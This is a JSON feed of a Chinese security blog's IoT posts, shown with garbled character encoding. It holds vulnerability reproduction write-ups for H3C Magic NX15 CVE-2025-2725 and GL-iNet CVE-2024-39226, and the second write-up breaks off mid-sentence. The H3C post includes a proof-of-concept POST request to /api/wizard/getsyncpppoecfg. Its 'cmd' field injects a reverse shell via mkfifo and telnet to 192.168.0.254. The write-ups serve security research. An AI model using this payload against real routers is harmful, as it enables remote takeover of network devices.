{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"iot\" tag",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2025/04/19/H3C-Magic-NX15%E2%80%94%E2%80%94cve-2025-2725%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/",
            "url": "https://yhuanhuan01.github.io/2025/04/19/H3C-Magic-NX15%E2%80%94%E2%80%94cve-2025-2725%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/",
            "title": "H3C-Magic-NX15â€”â€”cve-2025-2725å¤ç°åˆ†æ",
            "date_published": "2025-04-19T11:39:23.000Z",
            "content_html": "<h1 id=\"h3c-magic-nx15-cve-2025-2725å¤ç°åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#h3c-magic-nx15-cve-2025-2725å¤ç°åˆ†æ\">#</a> H3C-Magic-NX15 cve-2025-2725 å¤ç°åˆ†æ</h1>\n<blockquote>\n<p>å›ºä»¶ä¸‹è½½åœ°å€ï¼šğŸ‘‰https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/Catalog/H3C_N/NX15/?CHID=746147&amp;v=612</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxkYi5jb20vP2lkLjMwMDc0NQ==\">ç”± vulndb æ¦‚æ‹¬ï¼š</span></p>\n<p>H3C Magic NX15ã€Magic NX30 Proã€Magic NX400ã€Magic R3010 å’Œ Magic BE18000ï¼ˆV100R014 åŠæ›´é«˜ç‰ˆæœ¬ï¼‰ä¸­å‘ç°ä¸€ä¸ªè¢«åˆ—ä¸º<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxkYi5jb20vP2tiLnJpc2s=\">ä¸¥é‡ï¼ˆCriticalï¼‰çš„æ¼æ´ã€‚è¯¥æ¼æ´å½±å“äº†</span> HTTP POST è¯·æ±‚å¤„ç†ç¨‹åºç»„ä»¶ä¸­æ–‡ä»¶ <code>/api/login/auth</code>  çš„ä¸€äº›æœªçŸ¥åŠŸèƒ½ã€‚æ“ä½œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ã€‚è¯¥æ¼æ´ç¼–å·ä¸º<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxkYi5jb20vP3NvdXJjZV9jdmUuMzAwNzQ1\"> CVE-2025-2725</span>ã€‚æ­¤æ”»å‡»éœ€è¦è®¿é—®æœ¬åœ°ç½‘ç»œã€‚æ­¤å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªå¯ç”¨çš„æ¼æ´åˆ©ç”¨ç¨‹åºã€‚å»ºè®®å‡çº§å—å½±å“çš„ç»„ä»¶ã€‚</p>\n<h4 id=\"å¤ç°æµç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#å¤ç°æµç¨‹\">#</a> å¤ç°æµç¨‹</h4>\n<p>ä»å‚å®¶ä¸‹è½½å›ºä»¶ï¼Œå¹¶è¿›è¡Œ binwalk è§£åŒ…ã€‚ç”±å‚å®¶å·²ç»æ›´äº†ä¸€ä¸ªæ–°å›ºä»¶ï¼ŒåŒæ—¶è¿›è¡Œè§£åŒ…ï¼Œçœ‹ä¸€ä¸‹é‡Œé¢å“ªé‡Œå‘ç”Ÿäº†æ”¹å˜ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419140741592.png\" alt=\"image-20250419140741592\"></p>\n<p>å¯ä»¥å‘ç°<img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419191124201.png\" alt=\"image-20250419191124201\"></p>\n<p>è¿™äº›å‡½æ•°éƒ½æœ‰ä¿®æ”¹è¿‡</p>\n<blockquote>\n<p>int __fastcall FCGI_WizardProtoProcess(const char *a1, int a2, int a3)</p>\n</blockquote>\n<p>çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œè¢«ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œå¤§æ¦‚ç‡æ˜¯åŒæ ·è°ƒç”¨çš„å‡½æ•°ã€‚æˆ‘ä»¬éœ€è¦äº¤å‰å¼•ç”¨å®šä½åˆ°ä¸Šæ¸¸å‡½æ•°ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143053433.png\" alt=\"image-20250419143053433\"></p>\n<blockquote>\n<p>int __fastcall FCGI_WizardProcess(const char *a1)</p>\n</blockquote>\n<p>å†æ¬¡å®šä½ï¼Œå¯ä»¥å®šä½åˆ°ä¸»å‡½æ•°ã€‚</p>\n<blockquote>\n<p>int __fastcall ftext(int argc, const char **argv, const char **envp)</p>\n</blockquote>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143254921.png\" alt=\"image-20250419143254921\"></p>\n<p>å¯ä»¥å‘ç°è¿›å…¥åˆ†æ”¯æ˜¯åŒ¹é… <code>v11 == /wizard</code></p>\n<blockquote>\n<p>v10 = getenv(â€œPATH_INFOâ€);</p>\n<p>â€¦</p>\n<p>v11 = (const char *)v10;</p>\n<p>â€¦</p>\n<p>else if ( !strncmp(v11, â€œ/wizardâ€, 7) )<br>\n{<br>\nFCGI_WizardProcess(v11);<br>\n}</p>\n</blockquote>\n<p>v11 æ˜¯è¯·æ±‚è·¯å¾„ - PATH_INFO</p>\n<p>æ¥ä¸‹æ¥è¿›è¡Œåˆ†æ <code>int __fastcall FCGI_WizardProtoProcess(const char *a1, int a2, int a3)</code></p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143643431.png\" alt=\"image-20250419143643431\"></p>\n<p>è·¯å¾„å­˜åœ¨åˆ™ä¸ä¼šè¿›å…¥æ­¤åˆ†æ”¯ã€‚é—®é¢˜ä¸å¤§ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143750174.png\" alt=\"image-20250419143750174\"></p>\n<p>è¦æœ‰è¯·æ±‚ä½“é•¿åº¦</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143854637.png\" alt=\"image-20250419143854637\"></p>\n<p>è¿™äº›è·¯å¾„éƒ½æ˜¯æˆ‘ä»¬ä¸èƒ½åŒ¹é…åˆ°çš„ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143949084.png\" alt=\"image-20250419143949084\"></p>\n<p>æ‰€ä»¥è¿›å…¥æ­¤å‡½æ•°ï¼Œéœ€è¦åŒ¹é…åˆ°ä¸Šé¢è¯·æ±‚è·¯å¾„å³å¯ï¼Œv15 åˆ™æ˜¯è¯·æ±‚è·¯å¾„é•¿åº¦ã€‚</p>\n<blockquote>\n<p>FCGI_WizardProtoProcess(path_info, path_lent, ct_lent);</p>\n</blockquote>\n<p>è‡³æ­¤ä¸‰ä¸ªå‚æ•°å·²ç»æ˜æ™°ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144207159.png\" alt=\"image-20250419144207159\"></p>\n<p>åœ¨ <code>FCGI_WizardProtoProcess</code>  è¿™ä¸ªåˆ†æ”¯å¹¶æ²¡æœ‰å‘ç°å‘½ä»¤æ³¨å…¥çš„ç‚¹ï¼Œæ‰€ä»¥ä¸èƒ½è¿›å…¥æ­¤åˆ†æ”¯ã€‚</p>\n<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸å¦‚å…ˆå»å®šä½åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144406934.png\" alt=\"image-20250419144406934\"></p>\n<p>æ‰€ä»¥åœ¨æ­¤å‡½æ•°æ‰¾åˆ°å†…æ‰¾åˆ° popen å‡½æ•°ï¼Œå¤§æ¦‚ç‡çŒœæµ‹æ˜¯ FCGI åº“å†…çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ‰¾æ‰¾è¿™ä¸ªå°±è¡Œï¼Œåˆ†æå‡½æ•°å†…éƒ¨é€»è¾‘å³å¯</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">[</span>huan@huan-IOT-Virtual-Platform<span class=\"token punctuation\">]</span> - <span class=\"token punctuation\">[</span>~/æ¡Œé¢/IOTåˆ†æ/H3C_Magic_NX15<span class=\"token punctuation\">]</span> - <span class=\"token punctuation\">[</span>å…­ <span class=\"token number\">4</span>æœˆ <span class=\"token number\">19</span>, 01:41<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">[</span>$<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> FCGI_popen               </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep: extractions/NX15V100R014.bin.extracted/1F0000/squashfs-root/usr/lib/libfcgi.so.0.0.0: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶</pre></td></tr></table></figure><p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144750151.png\" alt=\"image-20250419144750151\"></p>\n<p>å‘ç°è°ƒç”¨äº† popenï¼Œæ‰€ä»¥è¿™å°±æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚</p>\n<p>ä»ä¸‹å‘ä¸Šåˆ†æã€‚</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419191640633.png\" alt=\"image-20250419191640633\"></p>\n<p>å¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚</p>\n<p>åˆ†æçš„å·®ä¸å¤šï¼Œæ¥ä¸‹æ¥å°±ä½¿ç”¨ qemu æ­å»ºè™šæ‹Ÿç¯å¢ƒã€‚</p>\n<h4 id=\"æ­å»ºè™šæ‹Ÿç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#æ­å»ºè™šæ‹Ÿç¯å¢ƒ\">#</a> æ­å»ºè™šæ‹Ÿç¯å¢ƒ</h4>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419145644271.png\" alt=\"image-20250419145644271\"></p>\n<p>ä¸»æœºå†…</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> qemu-system-mipsel <span class=\"token parameter variable\">-nographic</span> <span class=\"token parameter variable\">-M</span> malta <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token parameter variable\">-kernel</span> vmlinux-2.6.32-5-4kc-malta <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token parameter variable\">-hda</span> debian_squeeze_mipsel_standard.qcow2 <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token parameter variable\">-net</span> nic,macaddr<span class=\"token operator\">=</span><span class=\"token number\">52</span>:54:00:12:34:56 <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token parameter variable\">-net</span> tap <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token parameter variable\">-append</span> <span class=\"token string\">\"root=/dev/sda1 console=ttyS0\"</span></pre></td></tr></table></figure><p>è™šæ‹Ÿæœºå†…</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419150709792.png\" alt=\"image-20250419150709792\"></p>\n<p>ä¼ è¾“æ–‡ä»¶</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ä¸»æœºå†…</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cvf</span> squashfs-root.tar squashfs-root</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">scp</span> <span class=\"token parameter variable\">-o</span> <span class=\"token assign-left variable\">HostKeyAlgorithms</span><span class=\"token operator\">=</span>+ssh-rsa,ssh-dss <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-O</span> squashfs-root.tar root@192.168.0.1:~/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#è™šæ‹Ÿæœºå†…</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> squashfs-root.tar</pre></td></tr></table></figure><p>chroot è®¾ç½®æ ¹ç›®å½•</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@debian-mipsel:~/squashfs-root<span class=\"token comment\"># mount -t proc /proc ./proc/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root@debian-mipsel:~/squashfs-root<span class=\"token comment\"># mount -o bind /dev ./dev/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@debian-mipsel:~/squashfs-root<span class=\"token comment\"># chroot ../squashfs-root/ sh</span></pre></td></tr></table></figure><p>å¯åŠ¨ web æœåŠ¡</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> /var/run</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log/lighttpd</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>./sbin/procd <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>./sbin/ubusd <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>./usr/sbin/lighttpd <span class=\"token parameter variable\">-D</span> <span class=\"token parameter variable\">-f</span> ./etc/lighttpd/lighttpd.conf <span class=\"token operator\">&amp;</span></pre></td></tr></table></figure><p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419192600159.png\" alt=\"image-20250419192600159\"></p>\n<p>ç­‰å¾…æ—¶é—´ä¸€ä¼š</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419180101476.png\" alt=\"image-20250419180101476\"></p>\n<p>è™½ç„¶åœ¨åŠ è½½ï¼Œæˆ‘ä»¬å»æŸ¥çœ‹æ¥å£</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419180206626.png\" alt=\"image-20250419180206626\"></p>\n<p>æ˜¾ç¤º 200 ä¼°è®¡æ²¡å¤šå¤§é—®é¢˜ã€‚</p>\n<h4 id=\"æ„é€ poc\"><a class=\"markdownIt-Anchor\" href=\"#æ„é€ poc\">#</a> æ„é€  POC</h4>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/api/wizard/getsyncpppoecfg</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">192.168.0.1</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/json;charset=utf-8</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://192.168.0.1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/json, text/plain, */*</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://192.168.0.1/login</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">108</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&#123;\"cmd\":\"'; mkfifo /tmp/f; /usr/bin/telnet 192.168.0.254 10001 &lt; /tmp/f | /bin/sh > /tmp/f; rm /tmp/f; '\"&#125;</pre></td></tr></table></figure><p>cmd æ˜¯ä¼ è¿›çš„ post å‚æ•°</p>\n<p><img data-src=\"/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419193338001.png\" alt=\"image-20250419193338001\"></p>\n<p>è‡³æ­¤æ”»å‡»æµç¨‹å®Œæ¯•ï¼Œè¿˜æœ‰å‡ ä¸ª CVE æµç¨‹è·Ÿè¿™ä¸ªä¸€æ ·ã€‚</p>\n<blockquote>\n<p>CVE-2025-2725</p>\n<p>CVE-2025-2726</p>\n</blockquote>\n",
            "tags": [
                "IOT"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2025/03/21/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/",
            "url": "https://yhuanhuan01.github.io/2025/03/21/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/",
            "title": "GL-iNet-è·¯ç”±å™¨-CVE-2024-39226",
            "date_published": "2025-03-21T11:01:36.000Z",
            "content_html": "<h1 id=\"gl-netè·¯ç”±å™¨cve-2024-39226å¤ç°åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#gl-netè·¯ç”±å™¨cve-2024-39226å¤ç°åˆ†æ\">#</a> GL-Net è·¯ç”±å™¨ cve-2024-39226 å¤ç°åˆ†æ</h1>\n<h3 id=\"1æè¿°\"><a class=\"markdownIt-Anchor\" href=\"#1æè¿°\">#</a> 1. æè¿°ï¼š</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dsLWluZXQvQ1ZFLWlzc3Vlcy9ibG9iL21haW4vNC4wLjAvczJzJTIwaW50ZXJmYWNlJTIwc2hlbGwlMjBpbmplY3Rpb24ubWQ=\">è¯¥æ¼æ´å¯è¢«åˆ©ç”¨é€šè¿‡ s2s API ä¼ é€’æ¶æ„ shell å‘½ä»¤æ¥æ“çºµè·¯ç”±å™¨ã€‚</span></p>\n<p>ä»è¯·æ±‚ä½“ä¸­çš„ json æ•°æ®ä¸­è·å– portï¼Œä¸‹é¢å¯¹è·å–åˆ°çš„ port çš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ ¡éªŒï¼Œä½†æ˜¯å¹¶ä¸ä¸¥æ ¼ã€‚</p>\n<h3 id=\"2ä»¿çœŸæ¨¡æ‹Ÿ\"><a class=\"markdownIt-Anchor\" href=\"#2ä»¿çœŸæ¨¡æ‹Ÿ\">#</a> 2. ä»¿çœŸæ¨¡æ‹Ÿ</h3>\n<blockquote>\n<p>å›ºä»¶ç‰ˆæœ¬ï¼šGL-AX1800 Flint 4.5.16</p>\n</blockquote>\n<p>ä¸‹è½½åœ°å€ğŸ‘‰https://dl.gl-inet.cn/</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" checked=\"true\" disabled=\"true\"><label for=\"cbx_0\"> <s>è¿›è¡Œè§£å‹ openwrt-ax1800-4.5.16-0321-1711030388.tar</s></label></li>\n</ul>\n<p>è§£å‹åæœ‰ root æ–‡ä»¶ï¼Œè¿›è¡Œ binwalk -Me è§£åŒ…</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ binwalk <span class=\"token parameter variable\">-Me</span> root</pre></td></tr></table></figure><blockquote>\n<p>yhuan@h711:~/Desktop/IOT åˆ†æ / GL-iNet/_root.extracted/squashfs-root/bin$</p>\n<p>file busybox</p>\n<p>busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, no section header</p>\n</blockquote>\n<p>å¾—çŸ¥æ˜¯ 32 ä½ ARM çš„æ¶æ„</p>\n<h5 id=\"qemuä»¿çœŸ\"><a class=\"markdownIt-Anchor\" href=\"#qemuä»¿çœŸ\">#</a> qemu ä»¿çœŸï¼š</h5>\n<p>åœ¨ qemu ä»¿çœŸæ—¶ï¼Œè¸©äº†ä¸å°‘å‘ã€‚å¥½å¥½å†™å†™</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW9wbGUuZGViaWFuLm9yZy9+Z2lvL2RxaWIv\">é•œåƒä¸‹è½½åœ°å€ç‚¹è¿™é‡Œ</span></p>\n<p>ä¸‹è½½å®Œé•œåƒä¹‹åï¼Œè¿›è¡Œå®¿ä¸»æœºçš„ç½‘ç»œé…ç½®ï¼Œå‰æè¦æœ‰ <code>qemu-system-arm</code></p>\n<blockquote>\n<p>sudo apt install libvirt <code>-</code> daemon <code>-</code> system libvirt <code>-</code> clients virt <code>-</code> manager</p>\n</blockquote>\n<p>æ­å»ºè™šæ‹Ÿç½‘æ¡¥</p>\n<p>æ²¡æœ‰çš„æƒ…å†µå¯ä»¥è‡ªå·±é…ç½®ä¸€ä¸ª</p>\n<blockquote>\n<p>sudo brctl addbr virbr0     # åˆ›å»ºæ¡¥æ¥</p>\n<p>sudo ip link set virbr0 up  # å¯åŠ¨æ¡¥æ¥</p>\n<p>sudo ip addr add 192.168.122.1/24 dev virbr0</p>\n</blockquote>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/1.png\" alt=\"1\"></p>\n<p>ç±»ä¼¼äºè¿™ä¸ªï¼Œåˆ›å»ºå¹¶å¯ç”¨åä¸º tap0 çš„ TAP è®¾å¤‡ï¼Œå†å°†å…¶æ·»åŠ åˆ° virbr0 ç½‘æ¡¥ä¸­ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶æƒé™ã€‚</p>\n<blockquote>\n<p>sudo ip tuntap add dev tap0 mode tap<br>\nsudo ip link set tap0 up<br>\nsudo brctl addif virbr0 tap0<br>\nsudo chmod 666 /dev/net/tun</p>\n</blockquote>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/2.png\" alt=\"2\"></p>\n<p>ç±»ä¼¼äºè¿™æ ·ï¼ŒåŠ ä¸‹æ¥ä½¿ç”¨ <code>brctl show</code>  çœ‹ä¸€ä¸‹ç½‘æ¡¥çŠ¶æ€</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/3.png\" alt=\"3\"></p>\n<p>è¿™æ ·å¯ä»¥è¿›è¡Œåé¢çš„æ“ä½œäº†ï¼Œè‹¥<strong> STP enabled</strong> (å‘½ä»¤åŠŸèƒ½ stp v-stp enable å‘½ä»¤<strong>ç”¨æ¥ä½¿èƒ½ STP è¿›å…¥è·¨è®¾å¤‡ç»„åˆå·¥ä½œæ¨¡å¼</strong>ã€‚ undo stp v-stp enable å‘½ä»¤ç”¨æ¥å»ä½¿èƒ½ STP è¿›å…¥è·¨è®¾å¤‡ç»„åˆå·¥ä½œæ¨¡å¼ã€‚ ç¼ºçœæƒ…å†µä¸‹ï¼ŒSTP è¿›å…¥è·¨è®¾å¤‡ç»„åˆå·¥ä½œæ¨¡å¼å¤„äºå»ä½¿èƒ½çŠ¶æ€) æ˜¾ç¤º noï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯</p>\n<p><code>sudo brctl stp virbr0 on</code></p>\n<p>ä½¿ç”¨ qemu è¿›è¡Œå¼•å¯¼</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> qemu-system-arm <span class=\"token parameter variable\">-machine</span> <span class=\"token string\">'virt'</span> <span class=\"token parameter variable\">-cpu</span> <span class=\"token string\">'cortex-a15'</span> <span class=\"token parameter variable\">-m</span> 1G <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token parameter variable\">-device</span> virtio-blk-device,drive<span class=\"token operator\">=</span>hd <span class=\"token parameter variable\">-drive</span> <span class=\"token assign-left variable\">file</span><span class=\"token operator\">=</span>image.qcow2,if<span class=\"token operator\">=</span>none,id<span class=\"token operator\">=</span>hd <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token parameter variable\">-device</span> virtio-net-device,netdev<span class=\"token operator\">=</span>net <span class=\"token parameter variable\">-netdev</span> tap,id<span class=\"token operator\">=</span>net,ifname<span class=\"token operator\">=</span>tap0,script<span class=\"token operator\">=</span>no,downscript<span class=\"token operator\">=</span>no <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token parameter variable\">-kernel</span> kernel <span class=\"token parameter variable\">-initrd</span> initrd <span class=\"token parameter variable\">-nographic</span> <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token parameter variable\">-append</span> <span class=\"token string\">\"root=LABEL=rootfs console=ttyAMA0\"</span></pre></td></tr></table></figure><p>ä»¿çœŸå®Œæˆåè¿›è¡Œ qemu å†…è™šæ‹Ÿæœºç½‘ç»œé…ç½®</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/4.png\" alt=\"4\"></p>\n<blockquote>\n<p>root@debian:~# ip add add 192.168.122.130/24 dev eth0                                                                                                                                       root@debian:~# ip link set eth0 up<br>\nroot@debian:~# ip route add default via 192.168.122.1</p>\n</blockquote>\n<p>ç„¶åè¿›å…¥å®¿ä¸»æœºè¿›è¡Œæ–‡ä»¶ç³»ç»Ÿä¼ è¾“ï¼Œä¸€å®šè¦ä¸Š sudoï¼Œè¦ä¸å¯èƒ½ä¼šæœ‰æ–‡ä»¶ç¼ºå¤±</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> squashfs-root/ root@192.168.122.130:/root</pre></td></tr></table></figure><p>æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å¯åŠ¨ shell (å¯ä»¥åœ¨ä¸€ä¸ªç³»ç»Ÿçš„è™šæ‹Ÿæœºä¸Šä¼ ä¸åŒç‰ˆæœ¬çš„ suqashfs-rootï¼Œé€‰æ‹©æŒ‚è½½è¿›å…¥çš„ï¼Œå¯ä»¥å†™å‡ºä¸åŒçš„ sh è„šæœ¬)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> squashfs-root/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token parameter variable\">-t</span> proc /proc ./proc/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">bind</span> /dev ./dev/</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chroot</span> <span class=\"token punctuation\">..</span>/squashfs-root/ <span class=\"token function\">sh</span></pre></td></tr></table></figure><p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/5.png\" alt=\"5\"></p>\n<p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ï¼Œå¯ä»¥åœ¨å®¿ä¸»æœºè®¿é—® 192.168.122.130 